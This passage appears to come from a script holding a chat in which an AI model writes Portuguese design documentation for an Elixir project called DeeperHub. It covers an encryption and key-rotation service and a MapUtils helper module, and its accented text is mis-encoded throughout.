    *   **Rota√ß√£o de Chaves (`rotate_keys/0`, `perform_scheduled_rotation/0`):** Implementar um processo para rotacionar chaves de criptografia periodicamente ou sob demanda. Chaves antigas s√£o mantidas por um per√≠odo para descriptografar dados antigos, enquanto novas chaves s√£o usadas para novas criptografias.
    *   **Recriptografia de Dados:** Fornecer um mecanismo para recriptografar dados existentes com uma nova chave ap√≥s a rota√ß√£o (`rotate_and_reencrypt/1`).
    *   **Versionamento de Chaves:** Associar um ID e vers√£o a cada chave.
    *   **Revoga√ß√£o de Chaves (Opcional):** Marcar chaves como comprometidas ou n√£o mais em uso.
*   **Hashing de Senhas (Delega√ß√£o ou implementa√ß√£o pr√≥pria segura):**
    *   Fornecer funcionalidade para gerar hashes seguros de senhas e verificar senhas contra hashes armazenados (ex: usando Argon2, bcrypt). (Pode ser delegado para `DeeperHub.Auth.Services.PasswordService` ou um `HashingService` dedicado).
*   **Tipo Ecto para Campos Criptografados (`DeeperHub.Shared.Encryption.EncryptedType`):**
    *   Fornecer um tipo Ecto customizado que automaticamente criptografa/descriptografa campos de schemas ao serem persistidos/lidos do banco de dados.
*   **Verifica√ß√£o de Status do Servi√ßo (`check_status/0`):**
    *   Informar sobre a sa√∫de do servi√ßo de criptografia, incluindo a chave ativa e o status da rota√ß√£o.
*   **Observabilidade e Auditoria:**
    *   Logar opera√ß√µes de gerenciamento de chaves e erros de criptografia/descriptografia.
    *   Registrar m√©tricas sobre o uso de criptografia.
    *   Auditar a gera√ß√£o, rota√ß√£o e (se aplic√°vel) acesso a chaves.

## üèóÔ∏è 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.Core.EncryptionService` (Fachada P√∫blica):**
    *   Ponto de entrada para todas as opera√ß√µes de criptografia, descriptografia e gerenciamento b√°sico de chaves.
    *   Delega para o `EncryptionEngine` e o `KeyManagementService`.
2.  **`DeeperHub.Encryption.Engine` (M√≥dulo Funcional ou Servi√ßo):**
    *   **Responsabilidade:** Cont√©m a l√≥gica de baixo n√≠vel para realizar as opera√ß√µes criptogr√°ficas (criptografar/descriptografar) usando algoritmos espec√≠ficos (ex: AES-GCM).
    *   Obt√©m a chave apropriada do `KeyManagementService`.
    *   Utiliza o m√≥dulo `:crypto` do Erlang/Elixir.
3.  **`DeeperHub.Encryption.KeyManagementService` (GenServer):**
    *   **Responsabilidade:** Gerencia o ciclo de vida das chaves de criptografia.
    *   **Estado Interno:** Chave de criptografia ativa, conjunto de chaves antigas (para descriptografia), metadados das chaves, pr√≥xima data de rota√ß√£o.
    *   **Armazenamento de Chaves:** A forma como as chaves s√£o *realmente* armazenadas de forma segura √© cr√≠tica:
        *   **Ideal:** HSM ou KMS de nuvem. O `KeyManagementService` interagiria com o SDK/API desses servi√ßos.
        *   **Bom:** Chaves de dados criptografadas por uma Chave de Criptografia de Chave (KEK) ou Chave Mestra, que por sua vez √© protegida (ex: vari√°vel de ambiente segura, entrada manual no boot, HashiCorp Vault).
        *   **B√°sico (para desenvolvimento):** Chave(s) em arquivo de configura√ß√£o protegido ou vari√°vel de ambiente.
    *   **Intera√ß√µes:** `EncryptionEngine` solicita chaves. `RotationWorker` aciona rota√ß√£o.
4.  **`DeeperHub.Encryption.Workers.KeyRotationWorker` (GenServer):**
    *   **Responsabilidade:** Executar a rota√ß√£o de chaves de forma programada e, opcionalmente, iniciar o processo de recriptografia de dados em background.
5.  **`DeeperHub.Shared.Encryption.EncryptedType` (Ecto.Type):**
    *   Tipo customizado para Ecto que chama `EncryptionService.encrypt_for_storage` e `decrypt_from_storage` automaticamente.
6.  **Configura√ß√µes (via `DeeperHub.Core.ConfigManager`):**
    *   Algoritmo de criptografia padr√£o, tamanho da chave.
    *   Pol√≠tica de rota√ß√£o de chaves (frequ√™ncia).
    *   Configura√ß√µes para o `KeyManagementService` (ex: tipo de storage de chave, path para chave mestra).

### 3.2. Estrutura de Diret√≥rios (Proposta para `DeeperHub.Encryption`)

```
lib/deeper_hub/core/encryption_service.ex  # Fachada P√∫blica

lib/deeper_hub/encryption/                # L√≥gica interna de criptografia
‚îú‚îÄ‚îÄ engine.ex                           # L√≥gica de cripto/descripto
‚îú‚îÄ‚îÄ key_management_service.ex           # GenServer para gerenciar chaves
‚îÇ
‚îú‚îÄ‚îÄ workers/
‚îÇ   ‚îî‚îÄ‚îÄ key_rotation_worker.ex
‚îÇ
‚îú‚îÄ‚îÄ storage_adapters/                   # Para armazenamento seguro de chaves (se n√£o usar KMS externo)
‚îÇ   ‚îú‚îÄ‚îÄ kms_adapter.ex
‚îÇ   ‚îî‚îÄ‚îÄ file_key_storage.ex
‚îÇ
‚îú‚îÄ‚îÄ supervisor.ex
‚îî‚îÄ‚îÄ telemetry.ex
```
O `DeeperHub.Shared.Encryption.EncryptedType` permaneceria em `shared/encryption/`.

### 3.3. Decis√µes de Design Importantes

*   **Algoritmo de Criptografia:** Escolher um algoritmo sim√©trico forte e autenticado como AES-256-GCM √© recomendado.
*   **Gerenciamento de IV/Nonce:** Para modos como GCM ou CBC, um IV/Nonce √∫nico e imprevis√≠vel deve ser gerado para cada opera√ß√£o de criptografia e armazenado junto com o ciphertext.
*   **Autentica√ß√£o de Criptografia (AEAD):** Modos como GCM fornecem criptografia autenticada com dados associados (AEAD), que garante tanto a confidencialidade quanto a integridade/autenticidade dos dados. O \"contexto\" passado para as fun√ß√µes de encrypt/decrypt pode ser usado como AAD.
*   **Seguran√ßa das Chaves:** A seguran√ßa de todo o sistema de criptografia depende da seguran√ßa das chaves de criptografia. Esta √© a parte mais cr√≠tica.
*   **Rota√ß√£o de Chaves:** A rota√ß√£o regular de chaves √© uma pr√°tica de seguran√ßa importante. O sistema deve suportar a descriptografia de dados com chaves antigas enquanto criptografa novos dados com a chave atual.
*   **Recriptografia:** Ap√≥s a rota√ß√£o de chaves, os dados criptografados com chaves antigas devem ser gradualmente recriptografados com a nova chave (processo de background).

## üõ†Ô∏è 4. Casos de Uso Principais

*   **Armazenar Senha de API de Terceiros:**
    *   Um m√≥dulo de integra√ß√£o precisa armazenar uma API key para um servi√ßo externo.
    *   Chama `EncryptionService.encrypt_for_storage(api_key_string, %{service_name: \"Stripe\", context: \"api_key\"})`.
    *   O resultado criptografado √© salvo no banco de dados.
*   **Proteger PII em um Schema Ecto:**
    *   O `UserSchema` tem um campo `field :social_security_number, DeeperHub.Shared.Encryption.EncryptedType`.
    *   Quando um usu√°rio √© salvo, o `EncryptedType` automaticamente chama `EncryptionService.encrypt_for_storage` no valor do CPF.
    *   Quando o usu√°rio √© lido, o `EncryptedType` chama `EncryptionService.decrypt_from_storage`.
*   **Rota√ß√£o de Chave Agendada:**
    *   `KeyRotationWorker` √© acionado.
    *   Chama `KeyManagementService.rotate_key()`.
    *   `KeyManagementService` gera uma nova chave, define-a como ativa, e move a antiga para a lista de chaves de descriptografia.
    *   (Opcional) `KeyRotationWorker` inicia um processo em background para recriptografar dados antigos.

## üåä 5. Fluxos Importantes

### Fluxo de Criptografia (`encrypt_for_storage/2`)

1.  **Chamador (ex: `EncryptedType` ou servi√ßo):** Chama `DeeperHub.Core.EncryptionService.encrypt_for_storage(plain_value, context_map)`.
2.  **`Core.EncryptionService` (Fachada):** Delega para `Encryption.Engine.encrypt`.
3.  **`Encryption.Engine.encrypt`:**
    *   Solicita a chave de criptografia ativa (ID e material da chave) do `Encryption.KeyManagementService.get_current_key()`.
    *   Gera um IV/Nonce √∫nico.
    *   Usa o m√≥dulo `:crypto.block_encrypt(algorithm, key, iv, plaintext_padded, %{aad: serialized_context})` (para AES-GCM, a API √© um pouco diferente, ex: `:crypto.crypto_one_time_aead/6`).
    *   Obt√©m o ciphertext e a tag de autentica√ß√£o.
    *   Formata a sa√≠da incluindo o ID da chave, IV, tag e ciphertext (ex: um mapa ou uma string prefixada).
    *   Retorna `{:ok, encrypted_blob}`.

### Fluxo de Rota√ß√£o de Chave e Recriptografia (Simplificado)

1.  **`KeyRotationWorker`:** Acionado por agendamento.
2.  Chama `DeeperHub.Encryption.KeyManagementService.rotate_key()`.
3.  **`KeyManagementService`:**
    *   Gera uma nova chave (`new_key_material`, `new_key_id`).
    *   Define `new_key_id` como a chave ativa.
    *   Move a chave ativa anterior para uma lista de chaves \"antigas\" (ainda v√°lidas para descriptografia).
    *   (Opcional) Revoga/descarta chaves muito antigas que n√£o s√£o mais necess√°rias.
    *   Persiste o novo estado das chaves de forma segura.
    *   Retorna `{:ok, %{new_key_id: ..., old_active_key_id: ...}}`.
4.  **`KeyRotationWorker`:**
    *   Inicia um processo em background (ex: uma tarefa para o `Core.BackgroundTaskManager`) para recriptografar dados.
    *   A tarefa de recriptografia ir√°:
        *   Iterar sobre os dados que precisam ser recriptografados (ex: todas as linhas em tabelas com campos criptografados).
        *   Para cada dado:
            *   Chamar `Core.EncryptionService.decrypt(encrypted_data_with_old_key)`.
            *   Chamar `Core.EncryptionService.encrypt(decrypted_data_with_new_key)`.
            *   Atualizar o registro no banco de dados com o novo dado criptografado.
        *   Isso deve ser feito em lotes e de forma a minimizar o impacto no desempenho.

## üì° 6. API (Fun√ß√µes P√∫blicas da Fachada `DeeperHub.Core.EncryptionService`)

### 6.1. `DeeperHub.Core.EncryptionService.encrypt(data :: binary() | String.t(), context :: map() | nil) :: {:ok, EncryptedOutput.t()} | {:error, term()}`

*   **Descri√ß√£o:** Criptografa dados gen√©ricos.
*   **`context`:** Dados associados adicionais (AAD) para modos AEAD como AES-GCM. Garante que os dados s√≥ possam ser descriptografados no mesmo contexto.
*   **`EncryptedOutput.t()`:** Um mapa ou string que cont√©m o ciphertext, ID da chave usada, IV/nonce, e tag de autentica√ß√£o. Ex: `%{key_id: \"id\", iv: <<...>>, tag: <<...>>, ciphertext: <<...>>, algorithm: :aes_256_gcm}`.

### 6.2. `DeeperHub.Core.EncryptionService.decrypt(encrypted_output :: EncryptedOutput.t(), context :: map() | nil) :: {:ok, binary() | String.t()} | {:error, :decryption_failed | :integrity_check_failed | :key_not_found | term()}`

*   **Descri√ß√£o:** Descriptografa dados previamente criptografados por `encrypt/2`.
*   **`context`:** Deve ser o mesmo contexto usado durante a criptografia.

### 6.3. `DeeperHub.Core.EncryptionService.encrypt_for_storage(value :: term(), context :: map() | nil) :: {:ok, String.t()} | {:error, term()}`

*   **Descri√ß√£o:** Criptografa um valor (que pode ser qualquer termo Elixir serializ√°vel) para armazenamento em banco de dados. Retorna uma string √∫nica que cont√©m todos os metadados necess√°rios para descriptografia.
*   **Formato da String de Sa√≠da (Exemplo):** `\"ENCV1:AES256GCM:<key_id>:<base64_iv>:<base64_tag>:<base64_ciphertext>\"`
*   O `context` pode ser usado como AAD.

### 6.4. `DeeperHub.Core.EncryptionService.decrypt_from_storage(encrypted_string :: String.t(), context :: map() | nil) :: {:ok, term()} | {:error, term()}`

*   **Descri√ß√£o:** Descriptografa uma string previamente criptografada por `encrypt_for_storage/2`.

### 6.5. `DeeperHub.Core.EncryptionService.rotate_keys(opts :: keyword()) :: {:ok, %{new_key_id: String.t(), old_key_id: String.t()}} | {:error, term()}`

*   **Descri√ß√£o:** For√ßa uma rota√ß√£o da chave de criptografia ativa.
*   **`opts`:** Pode incluir `:trigger_re_encryption_job` (boolean).

### 6.6. `DeeperHub.Core.EncryptionService.re_encrypt_data_batch(query_function :: (() -> list(Ecto.Schema.t())), update_function :: ((Ecto.Schema.t(), map_of_reencrypted_fields) -> :ok | {:error, term()}), fields_to_re_encrypt :: list(atom()), opts :: keyword()) :: {:ok, %{processed: integer(), failed: integer()}}` (Nova Sugest√£o)

*   **Descri√ß√£o:** Fun√ß√£o de alto n√≠vel para ajudar no processo de recriptografia em lote.
*   **`query_function`:** Fun√ß√£o que retorna um lote de registros para recriptografar.
*   **`update_function`:** Fun√ß√£o que recebe o registro original e um mapa de campos recriptografados e os salva.
*   **`fields_to_re_encrypt`:** Lista dos campos na struct que usam `EncryptedType`.

## ‚öôÔ∏è 7. Configura√ß√£o

Via `DeeperHub.Core.ConfigManager`:

*   **`[:core, :encryption, :enabled]`** (Boolean): Habilita/desabilita a criptografia. (Padr√£o: `true`)
*   **`[:core, :encryption, :default_algorithm]`** (Atom): Algoritmo sim√©trico padr√£o (ex: `:aes_256_gcm`).
*   **`[:core, :encryption, :key_management, :provider]`** (Module): Adaptador para o provedor de gerenciamento de chaves (ex: `DeeperHub.Encryption.StorageAdapters.KMSAdapter`, `DeeperHub.Encryption.StorageAdapters.FileKeyStorage`).
*   **`[:core, :encryption, :key_management, :file_storage_path]`** (String): Caminho para o arquivo de chaves se `FileKeyStorage` for usado.
*   **`[:core, :encryption, :key_management, :master_key_env_var]`** (String): Nome da vari√°vel de ambiente que cont√©m a chave mestra (KEK) se as chaves de dados forem criptografadas em repouso por ela.
*   **`[:core, :encryption, :key_management, :key_rotation_days]`** (Integer): Frequ√™ncia de rota√ß√£o de chaves em dias. (Padr√£o: `90`)
*   **`[:core, :encryption, :key_management, :old_keys_to_keep_for_decryption]`** (Integer): N√∫mero de chaves antigas a serem mantidas para descriptografia. (Padr√£o: `2`)
*   **`[:core, :encryption, :at_rest_encryption_prefix]`** (String): Prefixo usado para strings criptografadas para armazenamento. (Padr√£o: `\"ENCV1:\"`)

## üîó 8. Depend√™ncias

### 8.1. M√≥dulos Internos

*   `DeeperHub.Core.ConfigManager`: Para configura√ß√µes.
*   `DeeperHub.Core.Logger`: Para logging.
*   `DeeperHub.Core.Metrics`: Para m√©tricas.
*   `DeeperHub.Core.BackgroundTaskManager`: Para jobs de recriptografia.
*   `DeeperHub.Audit`: Para auditar eventos de gerenciamento de chaves.

### 8.2. Bibliotecas Externas

*   `:crypto` (Erlang OTP): Para as opera√ß√µes criptogr√°ficas de baixo n√≠vel.
*   Bibliotecas cliente para KMS de nuvem (ex: `ExAws.KMS`), se usadas.
*   `Ecto` (para `EncryptedType`).

## ü§ù 9. Como Usar / Integra√ß√£o

*   **Schemas Ecto:** Usar `DeeperHub.Shared.Encryption.EncryptedType` para campos que precisam ser criptografados em repouso.
    ```elixir
    defmodule DeeperHub.Accounts.Schema.User do
      use Ecto.Schema
      alias DeeperHub.Shared.Encryption.EncryptedType

      schema \"users\" do
        field :email, :string
        field :social_security_number, EncryptedType # Ser√° criptografado
        field :api_token_for_service_x, EncryptedType # Outro exemplo
        # ...
      end
    end
    ```
*   **Servi√ßos que Armazenam Segredos:** Chamar `EncryptionService.encrypt_for_storage/2` antes de salvar e `decrypt_from_storage/2` ap√≥s ler.
    ```elixir
    def store_external_api_key(user_id, service_name, api_key) do
      context = %{user_id: user_id, service: service_name}
      {:ok, encrypted_key} = DeeperHub.Core.EncryptionService.encrypt_for_storage(api_key, context)
      # ... salvar encrypted_key no banco de dados ...
    end
    ```

## ‚úÖ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar as fun√ß√µes de encrypt/decrypt com diferentes dados e contextos.
*   Testar o tipo Ecto `EncryptedType` para garantir que ele criptografa/descriptografa corretamente durante as opera√ß√µes de `Repo`.
*   Testar o ciclo de vida das chaves: gera√ß√£o, rota√ß√£o, uso de chaves antigas para descriptografar.
*   Testar a recriptografia de dados.
*   Verificar se os metadados corretos (key_id, iv) s√£o armazenados e usados.
*   Localiza√ß√£o: `test/deeper_hub/core/encryption_service/` e `test/deeper_hub/encryption/`.

### 10.2. M√©tricas

*   `deeper_hub.core.encryption.encrypt.count` (tags: `algorithm`, `context_type`)
*   `deeper_hub.core.encryption.decrypt.count` (tags: `algorithm`, `key_id_used`, `status` (`success`, `failure`))
*   `deeper_hub.core.encryption.encrypt.duration_ms` (Histograma)
*   `deeper_hub.core.encryption.decrypt.duration_ms` (Histograma)
*   `deeper_hub.encryption.keys.rotated.count`
*   `deeper_hub.encryption.keys.active.info` (Gauge, com tags para `key_id`, `creation_date`)
*   `deeper_hub.encryption.data_re_encrypted.count` (Contador)

### 10.3. Logs

*   **N√≠vel INFO:** Chave rotacionada com sucesso. In√≠cio e fim de job de recriptografia.
*   **N√≠vel WARNING:** Tentativa de descriptografar dados com uma chave n√£o encontrada (mas pode ser uma chave antiga que deveria estar dispon√≠vel). Falha na verifica√ß√£o de integridade da tag de autentica√ß√£o.
*   **N√≠vel ERROR/CRITICAL:** Falha ao carregar a chave mestra. Falha ao gerar uma nova chave de dados. Erro irrecuper√°vel durante criptografia/descriptografia. Chave ativa n√£o encontrada.

### 10.4. Telemetria

*   `[:deeper_hub, :core, :encryption, :encrypt, :start | :stop | :exception]`
    *   Metadados: `%{data_size_bytes: size, context_present: boolean, key_id_used: id}`
*   `[:deeper_hub, :core, :encryption, :decrypt, :start | :stop | :exception]`
    *   Metadados: `%{key_id_from_blob: id, context_present: boolean, result: :success | :failure}`
*   `[:deeper_hub, :encryption, :key_management, :key_rotated]`
    *   Metadados: `%{new_key_id: id, old_key_id: id, trigger: :manual | :scheduled}`
*   `[:deeper_hub, :encryption, :key_management, :key_generated]`
    *   Metadados: `%{key_id: id}`

## ‚ùå 11. Tratamento de Erros

*   **Falha na Descriptografia:** Deve retornar um erro claro (ex: `:decryption_failed`, `:integrity_check_failed`). A aplica√ß√£o chamadora deve lidar com isso (ex: impedir acesso ao dado, solicitar re-entrada se for algo como uma configura√ß√£o).
*   **Chave N√£o Encontrada:** Se uma `key_id` referenciada em dados criptografados n√£o for encontrada pelo `KeyManagementService`, a descriptografia falhar√°. Isso pode indicar um problema s√©rio de gerenciamento de chaves ou corrup√ß√£o de dados.
*   **Falha na Gera√ß√£o/Rota√ß√£o de Chave:** S√£o eventos cr√≠ticos que devem ser alertados imediatamente.

## üõ°Ô∏è 12. Considera√ß√µes de Seguran√ßa (do pr√≥prio M√≥dulo)

*   **SEGURAN√áA DAS CHAVES √â PARAMOUNT:** A seguran√ßa de todo o sistema de criptografia repousa na seguran√ßa das chaves de criptografia de dados (DEKs) e, mais importante, da chave mestra (KEK) se usada para criptograf√°-las.
    *   A KEK NUNCA deve ser commitada no c√≥digo. Deve vir de uma vari√°vel de ambiente segura, um cofre de segredos (Vault), ou um KMS/HSM.
    *   Limite o acesso ao `KeyManagementService` e √†s suas opera√ß√µes de rota√ß√£o/gera√ß√£o.
*   **Escolha de Algoritmos:** Usar algoritmos padr√£o da ind√∫stria, fortes e com modos de opera√ß√£o seguros (ex: AES-256-GCM). Evitar algoritmos obsoletos ou implementa√ß√µes customizadas.
*   **IVs/Nonces:** Devem ser √∫nicos para cada criptografia com a mesma chave. N√£o reutilizar IVs.
*   **AAD (Additional Authenticated Data):** Usar AAD (contexto) corretamente com modos AEAD como GCM pode prevenir certos tipos de ataques onde o ciphertext √© movido para um contexto diferente.

## üßë‚Äçüíª 13. Contribui√ß√£o

*   Qualquer altera√ß√£o na l√≥gica de criptografia ou gerenciamento de chaves deve ser revisada por algu√©m com experi√™ncia em seguran√ßa e criptografia.
*   Seja extremamente cuidadoso ao lidar com o material da chave.
*   Novos campos sens√≠veis na aplica√ß√£o devem usar o `EncryptedType` ou as fun√ß√µes de `encrypt_for_storage`.

## üîÆ 14. Melhorias Futuras e TODOs

*   [ ] Integrar com um HSM ou KMS de nuvem para o armazenamento e opera√ß√µes com chaves de mais alto n√≠vel.
*   [ ] Implementar \"Envelope Encryption\" de forma mais expl√≠cita se usando KMS de nuvem.
*   [ ] Adicionar suporte para criptografia assim√©trica (chave p√∫blica/privada) se houver casos de uso (ex: compartilhar dados criptografados com terceiros de forma segura).
*   [ ] Desenvolver uma pol√≠tica de \"destrui√ß√£o criptogr√°fica\" para dados que precisam ser permanentemente irrecuper√°veis (destruindo a chave de criptografia associada).
*   [ ] Automatizar e robustecer o processo de recriptografia de dados em segundo plano para grandes volumes de dados, com monitoramento de progresso e tratamento de falhas.

---

*√öltima atualiza√ß√£o: 2025-05-12*

---

Criptografia e gerenciamento de chaves s√£o complexos, mas essenciais!

Temos agora uma boa base de m√≥dulos Core e de Seguran√ßa. Onde gostaria de ir agora?
Podemos detalhar os subm√≥dulos dos `Shared.Utils` (`MapUtils`, `ListUtils`, `ValidationUtils`, `FileUtils`, `SecurityUtils`), ou talvez um m√≥dulo de dom√≠nio como `DeeperHub.OAuth` ou `DeeperHub.MFA`?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Ok, dado que `DeeperHub.Shared.Utils` √© um agrupador, vamos detalhar um de seus componentes que √© frequentemente usado em toda a aplica√ß√£o: `DeeperHub.Shared.Utils.MapUtils`.

---

# M√≥dulo: `DeeperHub.Shared.Utils.MapUtils` üöÄ

## üìú 1. Vis√£o Geral do M√≥dulo `DeeperHub.Shared.Utils.MapUtils`

O m√≥dulo `DeeperHub.Shared.Utils.MapUtils` fornece um conjunto de **fun√ß√µes utilit√°rias para manipula√ß√£o e transforma√ß√£o de mapas (maps)** e, por extens√£o, de structs Elixir (que s√£o baseados em mapas). Estas fun√ß√µes s√£o projetadas para simplificar opera√ß√µes comuns em mapas, como convers√£o de tipos de chave, mesclagem profunda, filtragem de entradas, e acesso seguro a valores aninhados.

Sendo um m√≥dulo puramente funcional, ele n√£o gerencia estado e suas fun√ß√µes visam ser robustas e reutiliz√°veis em diversas partes do sistema DeeperHub. üòä

## üéØ 2. Responsabilidades e Funcionalidades Chave

*   **Convers√£o de Tipos de Chave:**
    *   Converter chaves de √°tomo para string em um mapa (`atom_keys_to_strings/2`).
    *   Converter chaves de string para √°tomo em um mapa (`string_keys_to_atoms/2`).
    *   Suporte para convers√£o recursiva em mapas aninhados.
*   **Manipula√ß√£o de Valores `nil`:**
    *   Remover todas as chaves de um mapa cujos valores s√£o `nil` (`compact/2`), opcionalmente de forma recursiva.
*   **Mesclagem de Mapas:**
    *   Mesclar dois mapas recursivamente (`deep_merge/2`), onde as chaves do segundo mapa t√™m preced√™ncia em caso de conflito.
*   **Filtragem de Entradas:**
    *   Filtrar as entradas de um mapa com base em uma fun√ß√£o predicado que opera sobre a chave e/o valor (`filter_map/2`).
*   **Acesso a Dados Aninhados:**
    *   Obter um valor de um caminho de chaves aninhadas dentro de um mapa, com um valor padr√£o se o caminho n√£o existir (`get_in_path/3`).
    *   Atualizar um valor em um caminho de chaves aninhadas dentro de um mapa (`update_in_path/3`).
*   **Transforma√ß√£o de Valores:**
    *   Aplicar uma fun√ß√£o a todos os valores de um mapa, opcionalmente de forma recursiva (`map_values/3`).
*   **Convers√£o de Estrutura:**
    *   Converter um mapa em uma lista de mapas chave-valor (`to_key_value_list/3`).

## üèóÔ∏è 3. Arquitetura e Design

### 3.1. Componentes Principais

*   **`DeeperHub.Shared.Utils.MapUtils` (M√≥dulo Funcional):**
    *   Cont√©m todas as fun√ß√µes de utilidade para mapas.
    *   Utiliza principalmente fun√ß√µes dos m√≥dulos `Map`, `Enum` e `Kernel` do Elixir.

### 3.2. Estrutura de Diret√≥rios

```
lib/deeper_hub/shared/utils/map_utils.ex
```

### 3.3. Decis√µes de Design Importantes

*   **Imutabilidade:** Todas as fun√ß√µes retornam novos mapas, n√£o modificando os mapas de entrada.
*   **Tratamento de Entradas:** Fun√ß√µes devem lidar de forma previs√≠vel com diferentes tipos de entrada (ex: mapas vazios, chaves n√£o existentes).
*   **Recursividade Opcional:** Para fun√ß√µes como convers√£o de chaves ou compacta√ß√£o, a op√ß√£o de aplicar a transforma√ß√£o recursivamente a mapas aninhados √© importante.
*   **Clareza e Previsibilidade:** As fun√ß√µes devem ter um comportamento claro e bem documentado.

## üõ†Ô∏è 4. Casos de Uso Principais

*   **Preparar Dados para API JSON:**
    *   Antes de serializar um struct Elixir (com chaves de √°tomo) para JSON, usar `MapUtils.atom_keys_to_strings(data, true)` para converter todas as chaves para strings.
*   **Limpar Par√¢metros de Requisi√ß√£o:**
    *   Receber `params` de uma requisi√ß√£o web e usar `MapUtils.compact(params)` para remover quaisquer chaves com valores `nil` antes de pass√°-los para um servi√ßo.
*   **Configura√ß√£o de Mesclagem:**
    *   Mesclar configura√ß√µes padr√£o com configura√ß√µes espec√≠ficas do usu√°rio: `MapUtils.deep_merge(default_config, user_config)`.
*   **Extrair Configura√ß√µes Espec√≠ficas:**
    *   De um grande mapa de configura√ß√£o, extrair apenas as configura√ß√µes relevantes: `MapUtils.filter_map(all_configs, fn key, _value -> String.starts_with?(Atom.to_string(key), \"email_\") end)`.
*   **Acessar Prefer√™ncia Aninhada:**
    *   `MapUtils.get_in_path(user_settings, [:notifications, :email, :marketing_opt_in], false)`.

## üåä 5. Fluxos Importantes

N√£o aplic√°vel no mesmo sentido que m√≥dulos com estado. O fluxo √© a execu√ß√£o da fun√ß√£o com os dados de entrada e o retorno do mapa transformado.

## üì° 6. API (Fun√ß√µes P√∫blicas do M√≥dulo)

*(Baseado na documenta√ß√£o original e mantendo a consist√™ncia)*

### 6.1. `DeeperHub.Shared.Utils.MapUtils.atom_keys_to_strings(map_data :: map(), recursive :: boolean() \\\\ false) :: map()`

*   **Descri√ß√£o:** Converte todas as chaves de √°tomo em `map_data` para strings.
*   **`recursive`:** Se `true`, aplica a convers√£o a todos os mapas aninhados.

### 6.2. `DeeperHub.Shared.Utils.MapUtils.string_keys_to_atoms(map_data :: map(), recursive :: boolean() \\\\ false) :: map()`

*   **Descri√ß√£o:** Converte todas as chaves de string em `map_data` para √°tomos.
*   **`recursive`:** Se `true`, aplica a convers√£o a todos os mapas aninhados.
*   **Cuidado:** Usar com cautela, pois a cria√ß√£o excessiva de √°tomos pode levar ao esgotamento da tabela de √°tomos do Erlang. Prefer√≠vel para chaves conhecidas.

### 6.3. `DeeperHub.Shared.Utils.MapUtils.compact(map_data :: map(), recursive :: boolean() \\\\ false) :: map()`

*   **Descri√ß√£o:** Remove todas as chaves de `map_data` cujos valores s√£o `nil`.
*   **`recursive`:** Se `true`, aplica a compacta√ß√£o a todos os mapas aninhados.

### 6.4. `DeeperHub.Shared.Utils.MapUtils.deep_merge(map1 :: map(), map2 :: map()) :: map()`

*   **Descri√ß√£o:** Mescla `map2` em `map1`. Se uma chave existir em ambos, o valor de `map2` √© usado. Se os valores para uma chave comum forem ambos mapas, eles s√£o mesclados recursivamente.
*   **Exemplo:**
    ```elixir
    map_a = %{a: 1, b: %{c: 2, d: 3}}
    map_b = %{b: %{d: 4, e: 5}, f: 6}
    MapUtils.deep_merge(map_a, map_b)
    #=> %{a: 1, b: %{c: 2, d: 4, e: 5}, f: 6}
    ```

### 6.5. `DeeperHub.Shared.Utils.MapUtils.filter_map(map_data :: map(), predicate_fun :: ((key :: term(), value :: term()) -> boolean())) :: map()`

*   **Descri√ß√£o:** Retorna um novo mapa contendo apenas as entradas de `map_data` para as quais `predicate_fun` retorna `true`.

### 6.6. `DeeperHub.Shared.Utils.MapUtils.get_in_path(map_data :: map(), path :: list(atom() | String.t()), default_value :: term() \\\\ nil) :: term()`

*   **Descri√ß√£o:** Acessa um valor aninhado em `map_data` usando uma `path` (lista de chaves). Retorna `default_value` se qualquer parte do caminho n√£o existir. (Similar a `get_in/2` do Kernel, mas com um `default_value` expl√≠cito e talvez mais flexibilidade nos tipos de chave no path).

### 6.7. `DeeperHub.Shared.Utils.MapUtils.update_in_path(map_data :: map(), path :: list(atom() | String.t()), new_value :: term()) :: map()`

*   **Descri√ß√£o:** Atualiza um valor em um caminho aninhado. Se o caminho n√£o existir completamente, ele pode ser criado (dependendo da implementa√ß√£o exata, ou pode falhar). (Similar a `put_in/3` ou `update_in/3` do Kernel).

### 6.8. `DeeperHub.Shared.Utils.MapUtils.map_values(map_data :: map(), transform_fun :: ((value :: term()) -> term()), recursive :: boolean() \\\\ false) :: map()`

*   **Descri√ß√£o:** Cria um novo mapa aplicando `transform_fun` a cada valor do `map_data` original.
*   **`recursive`:** Se `true`, e um valor for um mapa, aplica `map_values` a esse mapa aninhado.

### 6.9. `DeeperHub.Shared.Utils.MapUtils.to_key_value_list(map_data :: map(), key_field_name :: atom() \\\\ :key, value_field_name :: atom() \\\\ :value) :: list(map())`

*   **Descri√ß√£o:** Converte um mapa em uma lista de mapas, onde cada mapa na lista tem duas chaves: `key_field_name` (contendo a chave original) e `value_field_name` (contendo o valor original).
*   **Exemplo:**
    ```elixir
    MapUtils.to_key_value_list(%{name: \"Alice\", age: 30})
    #=> [%{key: :name, value: \"Alice\"}, %{key: :age, value: 30}]
    ```

## ‚öôÔ∏è 7. Configura√ß√£o

Este m√≥dulo, sendo puramente funcional e gen√©rico, geralmente n√£o requer configura√ß√µes externas. Comportamentos padr√£o (ex: para `compact` recursivo) s√£o definidos por argumentos de fun√ß√£o.

## üîó 8. Depend√™ncias

### 8.1. M√≥dulos Internos

*   Nenhuma.

### 8.2. Bibliotecas Externas

*   Utiliza principalmente os m√≥dulos `Map` e `Enum` do Elixir padr√£o.

## ü§ù 9. Como Usar / Integra√ß√£o

Importar ou usar alias e chamar as fun√ß√µes diretamente.

```elixir
alias DeeperHub.Shared.Utils.MapUtils

def process_user_input(params) do
  string_keyed_params = MapUtils.atom_keys_to_strings(params)
  compacted_params = MapUtils.compact(string_keyed_params, true)
  # ...
end

def get_notification_setting(user_prefs, type, channel) do
  MapUtils.get_in_path(user_prefs, [:notifications, type, channel], true) # Default to true
end
```

## ‚úÖ 10. Testes e Observabilidade

### 10.1. Testes

*   Testes unit√°rios extensivos para cada fun√ß√£o, cobrindo:
    *   Mapas vazios.
    *   Mapas com diferentes tipos de chaves e valores.
    *   Comportamento recursivo vs. n√£o recursivo.
    *   Casos de borda (ex: `get_in_path` com caminho parcialmente existente).
    *   Tratamento de `nil` como entrada.
*   Localiza√ß√£o: `test/deeper_hub/shared/utils/map_utils_test.exs`.

### 10.2. M√©tricas / 10.3. Logs / 10.4. Telemetria

